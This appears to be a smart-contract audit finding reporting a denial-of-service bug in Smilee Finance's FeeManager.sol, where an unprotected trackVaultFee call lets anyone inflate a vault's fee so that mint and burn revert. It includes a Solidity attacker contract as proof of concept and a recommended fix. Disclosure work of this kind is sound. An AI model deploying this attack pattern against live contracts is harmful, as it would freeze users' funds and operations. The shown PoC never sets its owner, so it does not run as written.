# `IG.sol` mint and burn functions are vulnerable to DOS attack

## Summary
the `trackVaultFee` function in `FeeManager.sol` can be called by anybody to add to the `feeAmount` of a vault, which essentially allows anyone to set the `feeAmount` to a very high value causing subsequent calls to this function to revert

https://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/FeeManager.sol#L218

## Vulnerability Detail
the `trackVaultFee` function in the `feeManager` contract is used to keep track of the fees accrued by the vaults. However, this function is unprotected and can be called by anyone provided the function call `IDVP(msg.sender).vault()` is equal to the function argument `address vault`

## Impact
the impact of that an attacker can cause all calls to the `mint` and `burn` functions to revert

## Code Snippet
consider a contract that can be used to execute the attack

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface IFeeManager {
    function trackVaultFee(address vault, uint256 feeAmount) external;
}

contract Attacker {
    address private vault_;
    address private owner;

    function vault() external view returns (address) {
        return vault_;
    }

    function set_vault(address vaultAddress) external {
        require(msg.sender == owner, "Only Owner");
        vault_ = vaultAddress;
    }

    function attack(address feeManager, uint256 feeAmount) external {
        require(msg.sender == owner, "Only Owner");
        IFeeManager(feeManager).trackVaultFee(vault_, feeAmount);
    }

}
```

## Tool used

Manual Review

## Recommendation
store a mapping of dvp addresses in the fee manager contract to allow only trusted dvp contracts to call the `trackVaultFee` function
